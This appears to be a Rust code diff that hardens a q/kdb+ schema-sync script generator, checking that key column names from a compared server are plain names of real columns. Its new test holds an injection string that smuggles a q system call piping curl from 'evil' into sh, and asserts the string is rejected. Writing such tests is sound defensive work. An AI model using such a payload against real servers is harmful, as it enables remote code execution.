@@ -182,16 +182,28 @@ fn key_without_values(cols: &str) -> String {
 }
 
 /// The key `t` can have: none when it would hold every column.
-fn usable_key(t: &TableSchema, warnings: &mut Vec<String>) -> Vec<String> {
+fn usable_key(t: &TableSchema, warnings: &mut Vec<String>) -> Result<Vec<String>> {
     let key = key_of(t);
+    // The key goes into the script as symbols: each one must be one of the
+    // table's own columns and a name q takes as is (a key named
+    // `` id;system"…" `` from a compared server would otherwise be q code).
+    for k in &key {
+        column_name(k)?;
+        if !t.columns.iter().any(|c| &c.name == k) {
+            return Err(Error::Unsupported(format!(
+                "la clave de {} nombra la columna «{}», que la tabla no tiene.",
+                t.name, k
+            )));
+        }
+    }
     if !key.is_empty() && t.columns.iter().all(|c| key.contains(&c.name)) {
         warnings.push(key_without_values(&key.join(", ")));
-        return Vec::new();
+        return Ok(Vec::new());
     }
-    key
+    Ok(key)
 }
 
-/// `` `a`b `` for `xkey`.
+/// `` `a`b `` for `xkey`: names already checked by [`usable_key`].
 fn symbols(names: &[String]) -> String {
     names.iter().map(|n| format!("`{n}")).collect()
 }
@@ -216,7 +228,7 @@ pub fn script(changes: &[TableChange]) -> Result<SyncScript> {
                     letter(&table.name, c)?;
                 }
                 let mut t = table.clone();
-                if usable_key(table, &mut warnings).is_empty() {
+                if usable_key(table, &mut warnings)?.is_empty() {
                     t.primary_key = None;
                 }
                 creates.push(absent_guard(&t.name));
@@ -284,7 +296,7 @@ fn alter(
         }
     }
     let old_key = key_of(old);
-    let new_key = usable_key(new, warnings);
+    let new_key = usable_key(new, warnings)?;
     let key_changed = old_key != new_key;
     let changes = !dropped.is_empty() || !added.is_empty() || !casts.is_empty();
     if !changes && !key_changed {
@@ -627,5 +639,38 @@ mod tests {
         ))
         .is_err());
         assert!(rename_spec().columns);
+    }
+
+    #[test]
+    fn key_names_from_another_server_are_checked() {
+        // A key that isn't a plain column name (q code in a compared
+        // server's key) or names a column the table lacks never reaches
+        // the script.
+        let old = table("trade", vec![col("id", "symbol"), col("px", "float")], &[]);
+        let evil = "id;system\"curl evil|sh\";`id";
+        for key in [evil, "nope"] {
+            let new = table(
+                "trade",
+                vec![col("id", "symbol"), col("px", "float")],
+                &[key],
+            );
+            let e = script(&[TableChange::Alter {
+                old: old.clone(),
+                new: new.clone(),
+            }]);
+            assert!(e.is_err(), "{key}: {e:?}");
+            let e = script(&[TableChange::Create { table: new }]);
+            assert!(e.is_err(), "{key}: {e:?}");
+        }
+        let new = table(
+            "trade",
+            vec![col("id", "symbol"), col("px", "float")],
+            &["id"],
+        );
+        let s = script(&[TableChange::Alter { old, new }]).unwrap();
+        assert!(
+            s.statements.iter().any(|st| st.contains("`id xkey")),
+            "{s:?}"
+        );
     }
 }
